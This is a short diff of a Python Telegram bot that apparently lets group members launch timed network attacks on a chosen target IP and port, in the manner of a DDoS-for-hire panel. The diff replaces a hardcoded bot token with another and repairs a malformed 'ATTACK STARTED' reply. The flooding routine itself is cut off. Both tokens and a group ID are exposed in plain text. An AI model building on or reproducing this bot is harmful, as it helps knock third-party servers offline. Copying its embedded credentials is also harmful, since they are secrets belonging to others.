@@ -10,7 +10,7 @@ import json
 import os
 
 # ✅ TELEGRAM BOT TOKEN
-bot = telebot.TeleBot('7053228704:AAFYb1L2ZgrYLUyJpBORaD9BH7PJLv_vAhA')
+bot = telebot.TeleBot('8048715452:AAGpMs2aMat59zaifZ0OD7zdI5Uw1jJ7hOw')
 
 # ✅ GROUP AND ADMIN DETAILS
 GROUP_ID = "-1002252633433"
@@ -250,7 +250,7 @@ def handle_attack(message):
     end_time = datetime.datetime.now(IST) + datetime.timedelta(seconds=time_duration)
     active_attacks[user_id].append((target, port, end_time))
 
-    bot.reply_to(message, f"🔥 ATTACK STARTED!\n🎯 TARGET: {target}\n🔢 PORT: {port}\n⏳ DURATION: {time_duration}s" !  SCREENSHOT OPTIONAL Hai, SEND KROGE TOH CHANNEL PE FORWARD HOGA!)
+    bot.reply_to(message, f"🔥 ATTACK STARTED!\n🎯 TARGET: {target}\n🔢 PORT: {port}\n⏳ DURATION: {time_duration}s")
 
     def attack_execution():
         try:
